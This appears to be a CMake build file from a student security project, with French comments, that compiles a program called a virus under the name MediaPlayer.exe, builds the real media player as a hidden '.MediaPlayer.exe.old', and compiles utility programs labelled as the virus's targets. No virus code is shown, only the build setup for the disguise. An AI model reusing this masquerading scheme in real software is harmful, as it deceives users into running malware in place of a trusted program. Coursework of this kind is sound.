cmake_minimum_required(VERSION 3.6)
project(TEA-Securite)

# on compile le virus
add_executable(MediaPlayer.exe Main.c)

# on compile media player
add_executable(.MediaPlayer.exe.old Mediaplayer.c)

# on comile les utilitaires (fichiers cibles du virus)
# on récupère tout les fichier utilitaires dans une liste
file(GLOB UTILS_FILES "${CMAKE_CURRENT_SOURCE_DIR}/Utils_*.c")

# pour chacun de ces fichiers on génère un executable
foreach(FILENAME ${UTILS_FILES})
    # on récupère le nom du fichier source et on créé le nom de l'executable depuis celui-ci
    get_filename_component(SRC ${FILENAME} NAME)
    get_filename_component(EXE ${FILENAME} NAME_WE)

    # on génère l'executable
    add_executable(${EXE} ${SRC})

    # on lie la librairie math.h à chaque exécutable car certains d'entre eux la nécessite (nous n'avons pas réussi a trouver comment détecter si un virus nécessite une librairie particulière afin de la lier uniquement aux fichiers qui en nécessitent)
    target_link_libraries(${EXE} m)
endforeach(FILENAME ${UTILS_FILES})
